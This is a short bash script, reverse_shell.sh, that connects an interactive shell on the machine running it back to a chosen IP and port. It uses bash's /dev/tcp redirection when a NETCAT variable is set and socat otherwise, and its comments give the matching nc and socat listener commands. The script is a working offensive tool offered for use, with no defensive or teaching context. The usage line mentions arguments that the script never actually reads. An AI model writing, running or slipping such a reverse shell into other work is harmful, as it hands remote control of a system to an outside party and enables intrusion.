#!/bin/bash

# Usage: ./reverse_shell.sh <IP> <PORT>
# Listener can be nc -tvnp $PORT if NETCAT env var is present
# or socat file:`tty`,raw,echo=0 tcp-listen:$PORT otherwise


if [ -n "$NETCAT" ];then
  bash -i >& "/dev/tcp/${IP}/${PORT}" 0>&1
else 
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane "tcp:${IP}:${PORT}"
fi